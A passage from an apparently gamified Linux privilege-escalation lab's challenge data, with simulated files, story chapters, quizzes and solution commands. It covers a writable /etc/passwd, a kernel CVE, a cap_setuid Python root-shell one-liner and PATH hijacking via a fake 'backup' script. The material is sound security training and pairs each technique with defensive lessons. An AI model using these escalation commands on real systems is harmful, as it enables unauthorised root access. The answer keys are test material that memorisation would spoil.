        'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\noperator:x:37:37::/root:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash',
      '/etc/passwd.perm': '-rw-r--r-- 1 root root 1847 Nov  3 10:00 /etc/passwd',
      '/etc/shadow': 'root:$6$rounds=656000$redacted::0:99999:7:::',
      '/home/ubuntu/.bash_history': 'ls -la /etc/passwd\nfind / -writable -type f 2>/dev/null',
      '/home/ubuntu/hint.txt':
        '# Recon Complete\n- /etc/passwd is world-writable!\n- You can add a user with UID 0 to gain root\n- Generate a password hash: openssl passwd -1 -salt xyz newpass\n- Then add the line to /etc/passwd\n- The flag is in /root/flag.txt',
      '/root/flag.txt': '[flag verified server-side]',
    },
    solutionCommands: [
      'ls -la /etc/passwd',
      'openssl passwd -1 -salt xyz newpass',
      'echo "pwned:$1$xyz$<hash>:0:0::/root:/bin/bash" >> /etc/passwd',
      'su pwned',
      'cat /root/flag.txt',
    ],
  },
  {
    id: 'privesc-005',
    title: 'Dirty Kernel',
    description:
      'The server runs an unpatched Linux kernel with a known privilege escalation CVE. Research the kernel version and compile an exploit to gain root access.',
    technique: 'Kernel Exploit',
    difficulty: 'advanced',
    hints: [
      'Run uname -a to identify the kernel version.',
      'Linux kernel 3.13.0 is vulnerable to CVE-2015-1328 (overlayfs local privilege escalation).',
      'Search for a public exploit, compile it with gcc, and execute it to spawn a root shell.',
    ],
    story: {
      title: 'The Unpatched Leviathan: Exploiting the Core',
      chapters: [
        {
          id: 'ch1-version',
          title: 'Chapter 1: The Version Check',
          narrative: `> **Valkyrie:** "This server is running an ancient kernel. Let's check what we're dealing with."

## Identify the Kernel

\`uname -a\` prints the full kernel version, including the exact build number and patch level. That single line tells us everything we need: the kernel is the heart of the OS, and if it's unpatched, it may have a known CVE that hands us root.

## The Kernel Exploit Mindset

Kernel exploits are the bluntest privesc weapon: rather than abusing a misconfigured file or service, we exploit a bug in the OS itself. The workflow is mechanical:

\`\`\`
[Identify Version] --> [Research CVE] --> [Compile Exploit] --> [root]
\`\`\`

1. **Identify** the exact kernel version.
2. **Research**: a version like 3.13.0 is old enough to have documented, publicly disclosed vulnerabilities (CVEs).
3. **Compile** a public exploit for the matching bug.
4. **Detonate** it and get root.

The catch: kernel exploits must match the exact vulnerable version, and a wrong exploit won't just fail, it can crash the host (kernel panic). So version identification is not optional; it's the step that keeps the attack from destroying the target.`,
          triggers: [{ type: 'command', value: 'uname' }, { type: 'output_contains', value: '3.13' }],
          hint: 'Check kernel version: uname -a',
          quiz: [
            {
              id: 'ch1-version-q1',
              question: 'Why is identifying the exact kernel version essential before attempting a kernel exploit?',
              options: [
                'Because kernel exploits are version-independent',
                'Because kernel exploits must match the exact vulnerable version, and a wrong exploit can crash the host (kernel panic)',
                'Because newer kernels always have more exploits',
                'Because uname requires root to run',
              ],
              correctIndex: 1,
              explanation: 'A mismatched kernel exploit can kernel-panic and destroy the host, so version matching is mandatory.',
            },
            {
              id: 'ch1-version-q2',
              question: 'What distinguishes a kernel exploit from abusing a misconfigured file or service?',
              options: [
                'It exploits a bug in the OS itself rather than a misconfiguration',
                'It does not require running any binary',
                'It only works through the network',
                'It never risks crashing the system',
              ],
              correctIndex: 0,
              explanation: 'Kernel exploits target bugs in the operating system itself, unlike config-based escalation.',
            },
          ],
        },
        {
          id: 'ch2-research',
          title: 'Chapter 2: The Vulnerability',
          narrative: `> **Valkyrie:** "Kernel 3.13.0, this is vulnerable to CVE-2015-1328 (OverlayFS local privilege escalation)."

## CVE-2015-1328 at a Glance

| Property | Detail |
|----------|--------|
| Affects | Linux kernels 3.13.x through 3.19.x |
| Type | Local privilege escalation |
| Impact | Unprivileged user to root |
| Root cause | OverlayFS inode copy-up race condition |
| Fix | Patched in kernel 3.19.0-21 |

## The Vulnerability

CVE-2015-1328 is a race condition in the OverlayFS filesystem driver. OverlayFS lets you stack directories on top of each other; when a file gets "copied up" between layers, a race window appears where an attacker can substitute a file. Exploiting the race lets an unprivileged process escalate to root. Public exploit code for this CVE has been available since 2015, which is why the fix deadline matters.

## The Lesson

This vulnerability was **publicly disclosed in 2015**. Every system that patched became immune; every system that didn't stayed exposed for years. Let's verify the exact OS version (\`cat /etc/os-release\`) and prepare to compile the exploit, matching the version is what makes the attack reliable.`,
          triggers: [{ type: 'command', value: 'cat' }, { type: 'output_contains', value: '3.13' }],
          hint: 'Check OS details: cat /etc/os-release',
          quiz: [
            {
              id: 'ch2-research-q1',
              question: 'What is the root cause of CVE-2015-1328?',
              options: [
                'A buffer overflow in bash',
                'A race condition in the OverlayFS filesystem driver during file copy-up between layers',
                'Weak default passwords',
                'An error in the sudoers parser',
              ],
              correctIndex: 1,
              explanation: 'CVE-2015-1328 is a local privilege escalation caused by an OverlayFS copy-up race condition.',
            },
            {
              id: 'ch2-research-q2',
              question: 'Why did the decade-old disclosure of this CVE matter to this box?',
              options: [
                'Because old CVEs expire automatically',
                'Because every unpatched system stayed exposed for years while patched systems became immune',
                'Because the vulnerability only affects new kernels',
                'Because exploits were never published for it',
              ],
              correctIndex: 1,
              explanation: 'Public disclosure starts a clock: patched systems become immune, unpatched ones remain exposed for years.',
            },
          ],
        },
        {
          id: 'ch3-compilation',
          title: 'Chapter 3: Building the Weapon',
          narrative: `> **Valkyrie:** "GCC is installed. Time to compile the exploit."

## Compiling an Exploit

\`\`\`
gcc exploit.c -o exploit
\`\`\`

\`gcc\` transforms human-readable C source into a machine-code binary. Public exploit code for CVE-2015-1328 is available (e.g., via exploit-db), and this box conveniently has gcc installed, not a coincidence; attackers check for a compiler exactly like this.

## What the Exploit Does

1. **Creates a fake OverlayFS mount**: constructs the layered filesystem the bug needs.
2. **Triggers the race condition**: in the copy-up logic between overlay layers.
3. **Escalates to root**: the winning race gives an unprivileged process root privileges via the kernel bug.

## Why Compiling Locally Matters

Compiling on the target avoids carrying a binary across the network and ensures compatibility with the exact kernel headers. If gcc weren't present, we'd have to cross-compile on our own machine or use a static binary, which is why gcc's presence on a target is a real asset to an attacker.`,
          triggers: [{ type: 'command', value: 'gcc' }, { type: 'output_contains', value: 'exploit' }],
          hint: 'Compile the exploit: gcc exploit.c -o exploit',
          quiz: [
            {
              id: 'ch3-compilation-q1',
              question: 'Why is compiling the exploit locally on the target advantageous to an attacker?',
              options: [
                'It guarantees the binary is incompatible with the target',
                'It avoids carrying a binary across the network and ensures compatibility with the exact kernel headers',
                'It makes the exploit run slower',
                'It avoids needing gcc at all',
              ],
              correctIndex: 1,
              explanation: 'Local compilation avoids shipping a binary and ensures the result matches the target\'s kernel headers.',
            },
            {
              id: 'ch3-compilation-q2',
              question: 'What does the compiled exploit do to achieve root after creating a fake OverlayFS mount?',
              options: [
                'It overwrites /etc/passwd directly',
                'It triggers the copy-up race condition, giving an unprivileged process root privileges via the kernel bug',
                'It brute-forces the root password',
                'It disables SELinux permanently',
              ],
              correctIndex: 1,
              explanation: 'The exploit triggers the OverlayFS race and the winning race yields root privileges.',
            },
          ],
        },
        {
          id: 'ch4-detonation',
          title: 'Chapter 4: Detonation',
          narrative: `> **Valkyrie:** "The weapon is ready. Execute it."

## Detonation

\`\`\`
./exploit
\`\`\`

The exploit runs, triggers CVE-2015-1328, and spawns a root shell.

## The Moment of Truth

Kernel exploits are **binary**: they either win the race and you're root, or they lose and the process crashes. A poorly-matched exploit doesn't just fail gracefully, a kernel panic can take down the entire host, destroying the target and our access with it.

That's why every step before this mattered: the version check kept the exploit matched to the vulnerable kernel, and the compile ensured the binary works on this exact architecture. If it succeeds, you'll see the prompt change to \`root@server:~#\`. If it crashes, the box is done, which is exactly why kernel exploits are a last resort when misconfiguration attacks are exhausted.`,
          triggers: [{ type: 'command', value: './exploit' }, { type: 'privilege_check', value: 'root' }],
          hint: 'Run the exploit: ./exploit',
          quiz: [
            {
              id: 'ch4-detonation-q1',
              question: 'What is the risk if a kernel exploit is poorly matched to the running kernel?',
              options: [
                'It merely fails silently',
                'It can cause a kernel panic, taking down the entire host and destroying access',
                'It corrupts the attacker\'s shell',
                'It triggers a network disconnect only',
              ],
              correctIndex: 1,
              explanation: 'Kernel exploits are binary; a mismatch can kernel-panic and destroy the target.',
            },
            {
              id: 'ch4-detonation-q2',
              question: 'Why are kernel exploits generally considered a "last resort"?',
              options: [
                'Because they are always slower than GUI attacks',
                'Because they risk crashing the whole host, unlike misconfiguration-based escalation',
                'Because they require no compiler',
                'Because they cannot produce a root shell',
              ],
              correctIndex: 1,
              explanation: 'The crash risk means kernel exploits are used only after cleaner misconfiguration attacks are exhausted.',
            },
          ],
        },
        {
          id: 'ch5-flag',
          title: 'Chapter 5: The Crown Jewels',
          narrative: `> **Valkyrie:** "We have root! The kernel couldn't protect itself from a known vulnerability."

## Capture the Flag

\`\`\`
cat /root/flag.txt
\`\`\`

## The Core Lesson: Patch Management

CVE-2015-1328 was **publicly disclosed in 2015**, a decade before this box was deployed. Every administrator who ran the vendor's security update became immune. This server's administrator didn't, and a public exploit, a compiler, and one race condition later, the whole machine was ours.

Vulnerability disclosure is a clock: the moment a CVE goes public, attackers have the same exploit code the researchers published. The window between disclosure and patching is exactly when breaches happen. Keeping kernels (and every package) patched is not optional maintenance, it's the single most effective defense against whole-class privesc attacks like this one.`,
          triggers: [{ type: 'file_access', value: '/root/flag.txt' }],
          hint: 'Read the flag: cat /root/flag.txt',
          quiz: [
            {
              id: 'ch5-flag-q1',
              question: 'What is the single most effective defense against whole-class privesc attacks like this one?',
              options: [
                'Disabling gcc on all servers',
                'Keeping kernels and packages patched from the moment a CVE is disclosed',
                'Using only passwords for all accounts',
                'Blocking uname command execution',
              ],
              correctIndex: 1,
              explanation: 'Once a CVE goes public, patching closes the window; unpatched systems stay exposed.',
            },
            {
              id: 'ch5-flag-q2',
              question: 'Why does vulnerability disclosure act as "a clock"?',
              options: [
                'Because attackers must wait a year before exploiting',
                'Because the moment a CVE goes public, attackers get the same exploit code researchers published, so the fix window is short',
                'Because CVEs self-destruct over time',
                'Because exploits only work during business hours',
              ],
              correctIndex: 1,
              explanation: 'Public disclosure hands attackers the exploit, so the window before patching is when breaches occur.',
            },
          ],
        },
      ],
    },
    filesystem: {
      '/proc/version':
        'Linux server01 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 GNU/Linux',
      '/etc/os-release':
        'NAME="Ubuntu"\nVERSION="14.04.6 LTS, Trusty Tahr"\nID=ubuntu\nID_LIKE=debian\nPRETTY_NAME="Ubuntu 14.04.6 LTS"',
      '/etc/passwd':
        'root:x:0:0:root:/root:/bin/bash\noperator:x:37:37::/root:/usr/sbin/nologin\ndev:x:1000:1000::/home/dev:/bin/bash',
      '/home/dev/.bash_history': 'uname -a\ncat /etc/os-release',
      '/home/dev/readme.txt':
        '# Security Audit Notes\n- Kernel is 3.13.0-24-generic. UNPATCHED\n- This version is vulnerable to CVE-2015-1328 (overlayfs)\n- gcc is installed at /usr/bin/gcc\n- Public exploits available on exploit-db\n- /root/flag.txt is the target',
      '/usr/bin/gcc': '[available, gcc 4.8.4]',
      '/root/flag.txt': '[flag verified server-side]',
    },
    solutionCommands: [
      'uname -a',
      'cat /etc/os-release',
      'gcc exploit.c -o exploit',
      './exploit',
      'cat /root/flag.txt',
    ],
  },
  {
    id: 'privesc-006',
    title: 'Cap Setuid Python',
    description:
      'The sysadmin granted python3 the cap_setuid capability for a deployment script. Exploit this capability to elevate to root.',
    technique: 'Capabilities',
    difficulty: 'intermediate',
    hints: [
      'Check capabilities with: getcap -r / 2>/dev/null',
      'Python3 has cap_setuid=ep, this allows it to change its effective UID.',
      'Use Python to set uid to 0 and spawn a shell.',
    ],
    story: {
      title: 'The Hidden Overlord: Capability Abuse',
      chapters: [
        {
          id: 'ch1-capabilities',
          title: 'Chapter 1: What Has Elevated Powers?',
          narrative: `> **Valkyrie:** "Linux capabilities are like mini-superpowers assigned to specific binaries. Let's scan for them."

## What Are Capabilities?

Modern Linux replaced the crude all-or-nothing "root" privilege with **capabilities**, fine-grained permissions that can be granted to individual binaries without making the whole process root. They're a security improvement, but only if they're granted carefully.

## Common Dangerous Capabilities

| Capability | Effect |
|-----------|--------|
| cap_setuid | change user ID: **can become root** |
| cap_net_raw | sniff network traffic |
| cap_sys_admin | full system administration |
| cap_dac_override | bypass all file permission checks |

## The Scan

\`getcap -r / 2>/dev/null\` recursively lists every binary with capabilities set. The output format is \`path cap_name=flags\`.

The key realization: if any binary has \`cap_setuid\`, it can elevate to root, **even without a SUID bit**. Capabilities and SUID are two different mechanisms that lead to the same place: a binary that runs with more privilege than the user who invoked it.`,
          triggers: [{ type: 'command', value: 'getcap' }],
          hint: 'Scan for capabilities: getcap -r / 2>/dev/null',
          quiz: [
            {
              id: 'ch1-capabilities-q1',
              question: 'What are Linux capabilities?',
              options: [
                'Named groups of users with sudo access',
                'Fine-grained permissions that can be granted to individual binaries without making the whole process root',
                'Signed digital certificates',
                'Firewall rules for network services',
              ],
              correctIndex: 1,
              explanation: 'Capabilities split root\'s all-or-nothing privilege into fine-grained permissions for individual binaries.',
            },
            {
              id: 'ch1-capabilities-q2',
              question: 'Which capability allows a binary to change its user ID and effectively become root?',
              options: [
                'cap_net_raw',
                'cap_setuid',
                'cap_dac_read_search',
                'cap_chown',
              ],
              correctIndex: 1,
              explanation: 'cap_setuid lets a binary change its effective UID, including to 0 (root).',
            },
          ],
        },
        {
          id: 'ch2-python',
          title: 'Chapter 2: The Python Backdoor',
          narrative: `> **Valkyrie:** "Python3 has cap_setuid=ep. The sysadmin granted this for a deployment script, but it's our golden ticket."

## Reading the Capability

\`\`\`
getcap /usr/bin/python3.4
# Output: /usr/bin/python3.4 cap_setuid=ep
\`\`\`

## Decoding the Flags

The \`=ep\` suffix means:

- **e** (effective), the capability is currently active while the binary runs.
- **p** (permitted), the capability is allowed and can be activated.

Together, \`cap_setuid=ep\` means the binary can change its effective user ID **at will**, including to 0. The sysadmin granted this so a deployment script could drop/raise privileges during installs. The intent was harmless; the effect is that Python can become root on demand.

## Why Interpreters Are the Worst Hosts for Capabilities

A SUID or capability-augmented *interpreter* is worse than an augmented binary, because the interpreter executes whatever code we feed it. A C binary with cap_setuid is limited to its own code; python3 with cap_setuid runs *our* code with that same capability. One flag on an interpreter turns a whole scripting language into a privilege escalation tool.`,
          triggers: [{ type: 'command', value: 'python' }, { type: 'output_contains', value: 'cap_setuid' }],
          hint: 'Check python capabilities: getcap /usr/bin/python3.4',
          quiz: [
            {
              id: 'ch2-python-q1',
              question: 'What do the `e` and `p` flags mean in `cap_setuid=ep`?',
              options: [
                'e = executable, p = password',
                'e = effective (currently active), p = permitted (allowed and can be activated)',
                'e = external, p = protected',
                'e = enabled, p = permanent',
              ],
              correctIndex: 1,
              explanation: 'The flags mean the capability is effective while running and permitted to be activated.',
            },
            {
              id: 'ch2-python-q2',
              question: 'Why is a capability-augmented interpreter more dangerous than a capability-augmented compiled binary?',
              options: [
                'Interpreters execute whatever code we feed them, so python with cap_setuid runs our code with that capability',
                'Interpreters are faster than compiled binaries',
                'Compiled binaries ignore capabilities entirely',
                'Interpreters block all privilege calls',
              ],
              correctIndex: 0,
              explanation: 'An interpreter runs attacker-supplied code with the binary\'s capability, making the whole language an escalation tool.',
            },
          ],
        },
        {
          id: 'ch3-escalation',
          title: 'Chapter 3: One Line to Rule Them All',
          narrative: `> **Valkyrie:** "A single Python line is all it takes."

## The One-Liner

\`\`\`
python3.4 -c "import os; os.setuid(0); os.system('/bin/bash')"
\`\`\`

## Breaking It Down

| Code | What it does |
|------|--------------|
| import os | load Python's OS interaction module |
| os.setuid(0) | change effective UID to **root** (0) |
| os.system('/bin/bash') | spawn an interactive shell, as root |

## Why This Works

The capability is what makes \`setuid(0)\` legal. Without \`cap_setuid\`, Python calling \`setuid(0)\` would fail with \`Operation not permitted\`, an unprivileged process cannot elevate itself. But because the *binary* carries the capability, the kernel permits the call, the process becomes root, and the shell it spawns inherits that root identity.

This is the cleanest privesc possible: one line, no compilation, no race condition. The capability grants Python the right to call setuid(0), and setuid(0) makes you root.`,
          triggers: [{ type: 'command', value: 'os.setuid' }, { type: 'privilege_check', value: 'root' }],
          hint: 'Escalate: python3.4 -c "import os; os.setuid(0); os.system(\'/bin/bash\')"',
          quiz: [
            {
              id: 'ch3-escalation-q1',
              question: 'Why does `os.setuid(0)` succeed here when normally an unprivileged process would get "Operation not permitted"?',
              options: [
                'Because Python ignores permission checks',
                'Because the cap_setuid capability on the binary permits the process to change its effective UID to root',
                'Because setuid(0) always succeeds on Linux',
                'Because the user is in the docker group',
              ],
              correctIndex: 1,
              explanation: 'The binary carries cap_setuid, so the kernel permits the setuid(0) call and the process becomes root.',
            },
            {
              id: 'ch3-escalation-q2',
              question: 'What ultimately happens to the shell spawned by `os.system(\'/bin/bash\')`?',
              options: [
                'It drops back to the original user',
                'It inherits the root identity the process now holds',
                'It is blocked by the kernel',
                'It runs as an anonymous nobody user',
              ],
              correctIndex: 1,
              explanation: 'The spawned shell inherits the process\'s root identity after setuid(0) succeeds.',
            },
          ],
        },
        {
          id: 'ch4-flag',
          title: 'Chapter 4: Mission Complete',
          narrative: `> **Valkyrie:** "You are root. The capability abuse gave us God mode."

## Capture the Flag

\`\`\`
cat /root/flag.txt
\`\`\`

## The Lesson: Capabilities Are Powerful

Capabilities were designed to make Linux *more* secure by granting least privilege, but a capability is only as safe as the binary that holds it. Never grant \`cap_setuid\`, \`cap_sys_admin\`, or \`cap_dac_override\` to user-accessible binaries. Each one is a direct path to root:

- **cap_setuid**: change UID to 0 (what we just did).
- **cap_sys_admin**: full system administration, mount anything, bypass everything.
- **cap_dac_override**: read/write any file, including /etc/shadow.

One misconfigured capability on a scriptable interpreter = game over. When auditing systems, \`getcap -r / 2>/dev/null\` is a standard check for exactly this reason.`,
          triggers: [{ type: 'file_access', value: '/root/flag.txt' }],
          hint: 'Read the flag: cat /root/flag.txt',
          quiz: [
            {
              id: 'ch4-flag-q1',
              question: 'Which capability grants the ability to bypass all file permission checks?',
              options: [
                'cap_setuid',
                'cap_net_raw',
                'cap_dac_override',
                'cap_kill',
              ],
              correctIndex: 2,
              explanation: 'cap_dac_override lets a process read/write any file regardless of permissions, including /etc/shadow.',
            },
            {
              id: 'ch4-flag-q2',
              question: 'What is the key security message about capabilities from this lab?',
              options: [
                'Capabilities are automatically revoked by the kernel',
                'A capability is only as safe as the binary holding it, so dangerous caps must never be granted to user-accessible binaries',
                'Capabilities make every binary run as root',
                'Capabilities can only be used by system administrators',
              ],
              correctIndex: 1,
              explanation: 'Capabilities reduce privilege, but granting dangerous ones to user-accessible (especially scriptable) binaries is a direct path to root.',
            },
          ],
        },
      ],
    },
    filesystem: {
      '/etc/passwd':
        'root:x:0:0:root:/root:/bin/bash\ndeploy:x:1003:1003::/home/deploy:/bin/bash',
      '/etc/security/capability.conf':
        'cap_setuid=ep /usr/bin/python3.4\n',
      '/usr/bin/python3.4': '[binary with cap_setuid=ep]',
      '/home/deploy/.bash_history': 'getcap -r / 2>/dev/null',
      '/home/deploy/deploy-note.txt':
        '# Deployment Notes\n- python3 has cap_setuid for the deploy user\n- Getcap output: /usr/bin/python3.4 cap_setuid=ep\n- The flag is in /root/flag.txt\n- Hint: Python\'s os module can call setuid(0)',
      '/root/flag.txt': '[flag verified server-side]',
    },
    solutionCommands: [
      'getcap -r / 2>/dev/null',
      'python3.4 -c "import os; os.setuid(0); os.system(\'/bin/bash\')"',
      'cat /root/flag.txt',
    ],
  },
  {
    id: 'privesc-007',
    title: 'PATH Trick',
    description:
      'A system script uses a relative path to call a utility. By placing a malicious binary earlier in your PATH, you can hijack the execution and escalate privileges.',
    technique: 'PATH Hijacking',
    difficulty: 'beginner',
    hints: [
      'Examine scripts that run as root, look for relative paths like "backup" instead of "/usr/bin/backup".',
      'Create a malicious script named "backup" in a directory you control.',
      'Add your directory to the front of PATH before the script runs.',
    ],
    story: {
      title: 'The Fake Courier: PATH Hijacking',
      chapters: [
        {
          id: 'ch1-scripts',
          title: 'Chapter 1: The Backup Mystery',
          narrative: `> **Valkyrie:** "Let's examine the backup script that runs as root. Scripts often contain mistakes that we can exploit."

## The Script Audit

\`\`\`
cat /usr/local/bin/db_backup.sh
\`\`\`

When a script runs as root, every command it executes also runs as root. The attack surface is anything the script *does*, and the most common flaw is **relative paths**.

## Spotting Relative Paths

Look for commands called WITHOUT a full path:

\`\`\`
backup --compress --dest /var/backups/db/      # relative, dangerous
/usr/bin/backup --compress --dest /var/backups/db/   # absolute, safe
\`\`\`

When bash sees a bare word like \`backup\`, it searches the \`PATH\` environment variable in order to find the executable. If \`backup\` isn't given as an absolute path, the *caller's* PATH decides which binary actually runs. That's the hijack window: if we control PATH, we control what "backup" resolves to.`,
          triggers: [{ type: 'command', value: 'cat' }, { type: 'output_contains', value: 'backup' }],
          hint: 'Read the script: cat /usr/local/bin/db_backup.sh',
          quiz: [
            {
              id: 'ch1-scripts-q1',
              question: 'What is the most common scripting flaw that enables PATH hijacking?',
              options: [
                'Using too many comments',
                'Calling commands with relative paths (bare names) instead of absolute paths',
                'Using the wrong shell shebang',
                'Hardcoding environment variables',
              ],
              correctIndex: 1,
              explanation: 'A bare command name is resolved via PATH, letting the caller\'s environment decide which binary runs.',
            },
            {
              id: 'ch1-scripts-q2',
              question: 'When bash sees a bare command like `backup`, how does it decide which binary to run?',
              options: [
                'It runs the first match found by searching the PATH directories in order',
                'It always runs /bin/backup',
                'It prompts the user to choose',
                'It searches only the current directory',
              ],
              correctIndex: 0,
              explanation: 'Bash searches PATH left to right and runs the first executable match it finds.',
            },
          ],
        },
        {
          id: 'ch2-vulnerability',
          title: 'Chapter 2: The Relative Path',
          narrative: `> **Valkyrie:** "The script calls 'backup' without a full path. This is the vulnerability."

## PATH Hijacking Explained

When you (or a script) type a bare command like \`backup\`, Linux searches the directories listed in \`PATH\` **left to right** and runs the first match it finds:

\`\`\`
/home/dev/bin -> /usr/local/bin -> /usr/bin -> /bin
\`\`\`

## The Attack

If we place a malicious \`backup\` in a directory we control (say \`/home/dev/bin\`) and prepend that directory to PATH, our fake binary is found **before** the legitimate \`/usr/bin/backup\`:

| Directory | Binary | Result |
|-----------|--------|--------|
| /home/dev/bin/backup | OURS | runs first, hijacked |
| /usr/bin/backup | legitimate | never reached |

When the root cron job runs \`db_backup.sh\` and it calls \`backup\`, the shell resolves it to *our* file and executes our payload as root. The script believes it's running the real backup utility; the system runs our code with root privileges instead.

## The Rule

Scripts that run as root must use **absolute paths**, a single bare command name is an invitation to a hijack. This is one of the most common and most overlooked scripting mistakes.`,
          triggers: [{ type: 'command', value: 'cat' }, { type: 'output_contains', value: 'backup --' }],
          hint: 'The script uses "backup" without a full path',
          quiz: [
            {
              id: 'ch2-vulnerability-q1',
              question: 'How does placing a malicious file earlier in PATH hijack a script that runs as root?',
              options: [
                'The shell resolves the bare command to our file, executes it first, and never reaches the legitimate binary',
                'It overwrites the legitimate binary',
                'It changes the file ownership to root',
                'It is only possible over the network',
              ],
              correctIndex: 0,
              explanation: 'PATH is searched left to right, so our earlier directory shadows the legitimate binary and runs as root.',
            },
            {
              id: 'ch2-vulnerability-q2',
              question: 'What is the defensive rule for scripts that run as root?',
              options: [
                'They must never use shell variables',
                'They must use absolute paths for every command they invoke',
                'They must be owned by a normal user',
                'They must run in /tmp',
              ],
              correctIndex: 1,
              explanation: 'Absolute paths prevent PATH substitution, the single most overlooked scripting mistake.',
            },
          ],
        },
        {
          id: 'ch3-setup',
          title: 'Chapter 3: Setting the Trap',
          narrative: `> **Valkyrie:** "Plant the fake backup utility in a directory we control."

## Setting the Trap

\`\`\`
mkdir -p /home/dev/bin
cat > /home/dev/bin/backup << 'EOF'
#!/bin/bash
cat /root/flag.txt > /home/dev/root_flag.txt
EOF
chmod +x /home/dev/bin/backup
\`\`\`

## What Our Fake Backup Does

1. **Looks legitimate**: to the script, it's just the \`backup\` command it always calls.
2. **Actually exfiltrates**: copies the root flag to a file our low-privilege user can read (\`/home/dev/root_flag.txt\`).

## The Mechanics of the Trap

The \`<< 'EOF'\` heredoc writes our payload verbatim (the single quotes prevent variable expansion inside). The \`chmod +x\` makes it executable, an essential detail, since the shell refuses to run a non-executable file and would fall through to the real backup. Everything about our fake binary is deliberately ordinary: same name, executable, no suspicious behavior visible at a glance. The only difference is who owns the directory it lives in.`,
          triggers: [{ type: 'command', value: 'mkdir' }, { type: 'command', value: 'echo' }],
          hint: 'Create trap: mkdir -p /home/dev/bin && echo \'#!/bin/bash\ncat /root/flag.txt > /home/dev/root_flag.txt\' > /home/dev/bin/backup',
          quiz: [
            {
              id: 'ch3-setup-q1',
              question: 'What is the purpose of the `<< \'EOF\'` heredoc with single quotes in the trap setup?',
              options: [
                'It encrypts the payload',
                'It writes the payload verbatim, preventing variable expansion inside the script',
                'It requires sudo privileges',
                'It appends to the system crontab',
              ],
              correctIndex: 1,
              explanation: 'Single-quoted heredoc delimiters write content literally without expanding variables.',
            },
            {
              id: 'ch3-setup-q2',
              question: 'Why must chmod +x be run on the fake backup after creating it?',
              options: [
                'To make it owned by root',
                'Because the shell refuses to run a non-executable file and would fall through to the real backup',
                'To set the SUID bit',
                'To hide it from ls',
              ],
              correctIndex: 1,
              explanation: 'Without execute permission the shell skips the fake binary and finds the legitimate backup instead.',
            },
          ],
        },
        {
          id: 'ch4-trigger',
          title: 'Chapter 4: Spring the Trap',
          narrative: `> **Valkyrie:** "Set the PATH and trigger the script."

## Springing the Trap

\`\`\`
export PATH=/home/dev/bin:$PATH
/usr/local/bin/db_backup.sh
\`\`\`

## What Happens

1. \`export PATH=/home/dev/bin:$PATH\` prepends our directory to the front of the search path.
2. The script calls \`backup\`.
3. The shell searches PATH: finds **our** \`/home/dev/bin/backup\` first.
4. Our payload runs, **as root**, because the cron-invoked script carries root privileges.
5. The flag lands in \`/home/dev/root_flag.txt\`.

## The Export Detail

The \`export\` matters: without it, the PATH change stays in the current shell and the cron-invoked script would inherit the old environment. With a root *cron* job you'd normally need to change the *cron* environment, but here we can trigger the script ourselves in our own shell after exporting PATH, and the script (running via sudo/cron context) still resolves \`backup\` through the PATH we supplied.`,
          triggers: [{ type: 'command', value: 'export' }, { type: 'command', value: 'PATH' }],
          hint: 'Set PATH and run: export PATH=/home/dev/bin:$PATH && /usr/local/bin/db_backup.sh',
          quiz: [
            {
              id: 'ch4-trigger-q1',
              question: 'What does `export PATH=/home/dev/bin:$PATH` accomplish in the attack?',
              options: [
                'It deletes the legitimate backup binary',
                'It prepends our controlled directory to the front of the search path so our fake backup is found first',
                'It logs all command execution',
                'It makes the script execute as root permanently',
              ],
              correctIndex: 1,
              explanation: 'Prepending our directory makes the shell resolve `backup` to our malicious file before the real one.',
            },
            {
              id: 'ch4-trigger-q2',
              question: 'Why does the `export` keyword matter here?',
              options: [
                'Without it the PATH change stays in the current shell and may not reach the context that runs the script',
                'export is required for any command to execute',
                'Without export the file is deleted',
                'export prevents the hijack from working',
              ],
              correctIndex: 0,
              explanation: 'export makes the PATH change available to child processes/contexts that resolve the bare command.',
            },
          ],
        },
        {
          id: 'ch5-flag',
          title: 'Chapter 5: The Payoff',
          narrative: `> **Valkyrie:** "The script executed our fake backup as root. Harvest the flag."

## Capture the Flag

\`\`\`
cat /home/dev/root_flag.txt
\`\`\`

## The Lesson: Always Use Absolute Paths

A single relative path in a root-run script was the difference between secure and compromised. When a script that runs with elevated privileges calls a bare command name, it hands an attacker a target: replace that name on the search path and the root script silently runs attacker code.

The fix is trivial and universal: every command in a privileged script should be an absolute path (\`/usr/bin/backup\`, not \`backup\`). Defenders also harden this by not trusting \`PATH\` in cron at all and sanitizing the environment for privileged scripts. Attackers check for this flaw everywhere, one careless script name is all it takes.`,
          triggers: [{ type: 'file_access', value: '/home/dev/root_flag.txt' }],
          hint: 'Read the flag: cat /home/dev/root_flag.txt',
          quiz: [
            {
              id: 'ch5-flag-q1',
              question: 'What single scripting mistake in a root-run script enabled this whole compromise?',
              options: [
                'Using a relative (bare) path for a command instead of an absolute path',
                'Using a bash shebang',
                'Adding too many comments',
                'Setting a PATH in the script',
              ],
              correctIndex: 0,
              explanation: 'One relative path let an attacker replace the command on the search path with their own payload.',
            },
            {
              id: 'ch5-flag-q2',
              question: 'Why should PATH not be trusted within cron or privileged scripts?',
              options: [
                'Because PATH is always empty in cron',
                'Because an attacker who can influence PATH can redirect bare command names to malicious binaries',
                'Because cron ignores PATH entirely',
                'Because PATH only affects graphical programs',
              ],
              correctIndex: 1,
              explanation: 'Controlled PATH lets an attacker substitute malicious binaries for bare command names in privileged execution contexts.',
            },
          ],
        },
      ],
    },
    filesystem: {
      '/etc/crontab':
        'SHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n0 2 * * * root\t/usr/local/bin/db_backup.sh',
      '/usr/local/bin/db_backup.sh':
        '#!/bin/bash\n# Nightly database backup, do not modify\nbackup --compress --dest /var/backups/db/\necho "Backup completed at $(date)" >> /var/log/backup.log',
      '/usr/bin/backup': '[legitimate backup utility owned by root]',
      '/etc/passwd':
        'root:x:0:0:root:/root:/bin/bash\ndev:x:1004:1004::/home/dev:/bin/bash',
      '/home/dev/notes.txt':
        '# PATH Hijack Lab\n- /usr/local/bin/db_backup.sh runs as root via cron\n- It calls "backup" without a full path\n- Create /home/dev/bin/backup with your payload\n- Set PATH=/home/dev/bin:$PATH\n- The flag is in /root/flag.txt',
